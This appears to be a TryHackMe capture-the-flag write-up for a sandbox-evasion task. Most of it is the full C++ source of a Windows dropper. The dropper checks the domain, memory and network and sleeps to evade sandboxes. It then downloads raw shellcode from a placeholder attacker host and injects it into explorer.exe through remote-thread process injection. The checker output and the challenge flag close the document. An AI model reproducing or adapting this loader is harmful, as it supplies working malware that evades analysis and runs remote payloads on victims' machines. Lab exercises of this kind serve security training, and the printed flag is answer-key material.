# The Great Escape

Create your own Sandbox Evasion executable. In order to escape the Sandbox, you must implement the following techniques:

* Check and see if the device is joined to an Active Directory Domain
* Check if the system memory is greater than 1GB of RAM
* Implement an outbound HTTP request to 10.10.10.10
* Implement a 60-second sleep timer before your payload is retrieved from your web server

If your dropper meets these requirements specified above, the flag will be printed out to you.

_The Sandbox Evasion Techniques can fail. The program analyses the binary to see if the checks are implemented. The outbound device may not have internet access - as long as the checks are implemented, the sandbox check should succeed._

* If you have done it right, the "Sleep Check" will take approximately one minute to reveal the flag.
* If your DNS check has `if(dcNewName.find("\\"))` instead of `if(dcNewName.find("\\\\"))` then you may have 
difficulties with the sleep check.

## Code

To use this code in the THM context for your machines, change the placeholder values `explorer.exe-pid` and `ATTACK_IP`.

```text
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

using namespace std;


BOOL isDomainController() {
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    if(dcNewName.find("\\\\")) {
        return FALSE;
    }
    else {
        return TRUE;
    }
}


BOOL checkIP()
{
    const char* websiteURL = "https://10.10.10.10";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    if (s == "VICTIM_IP") {
        return TRUE;
    }
    else {
        return FALSE;
    }
}


BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 1.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}


int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 510;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://ATTACK_IP:8080/index.raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[510];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, 510, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}


int main() {
        Sleep(60000);
        if (isDomainController() == TRUE) {
                 if (memoryCheck() == TRUE) {
                          if (checkIP() == TRUE) {
        downloadAndExecute();
                          }
                 }
    }
    return 0;
}
```

Check:

```text
C:\Users\Administrator\Desktop\Materials\> .\SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
[+] Memory Check found!
[+] Network Check found!
[+] GeoFilter Check found!
[+] Sleep Check found!
Congratulations! Here is your flag: THM{6c1f95ec}
```